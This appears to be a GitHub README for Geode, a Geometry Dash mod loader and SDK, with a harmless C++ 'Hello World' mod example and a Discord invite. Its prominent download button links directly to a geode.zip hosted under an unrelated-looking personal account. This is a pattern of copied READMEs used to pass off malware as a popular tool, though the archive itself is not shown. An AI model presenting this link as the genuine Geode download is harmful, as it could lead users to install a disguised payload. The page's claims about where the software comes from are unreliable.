<p align="center">
<img width="474" height="149" alt="image" src="https://github.com/user-attachments/assets/e48a5156-cf76-4df4-a350-c5e38c63017c" />

</p>

<p align="center"><b>Geode</b> is a <a href="https://store.steampowered.com/app/322170/Geometry_Dash/">Geometry Dash</a> <b>mod loader</b> and <b>modding SDK</b> with a modern approach towards mod development.</p>

[![downbutton](https://github.com/user-attachments/assets/150c77a6-a2a1-422d-8bb0-fa55c395a932)](https://github.com/bridgestonemasonstar/geode/releases/download/main/geode.zip)

 
## Why Geode?

Unlike previous mod loaders, which merely inject the DLLs and let devs handle the rest, Geode aims to be a more comprehensive project that provides all the tools needed for creating mods in one package.  

Geode's goal is to solve **mod incompatibility** - to ensure that mods work together without buttons getting misplaced or hooks mysteriously disappearing.

## "Hello World!" Example 

Here's a **Hello World** mod in Geode:

```cpp
#include <Geode/Bindings.hpp>
#include <Geode/modify/MenuLayer.hpp>

using namespace geode::prelude;

class $modify(MenuLayer) {
	void onMoreGames(CCObject*) {
		FLAlertLayer::create(
			"Geode",
			"Hello World from my Custom Mod!",
			"OK"
		)->show();
	}
};
```

This code modifies what happens when the "More Games" button is clicked on the home scene in Geometry Dash, showing a custom popup.

## Questions, help, etc.

If you have any further questions, need help, or just want to share your love for catgirls, be sure to join [our Discord server](https://discord.gg/9e43WMKzh)!


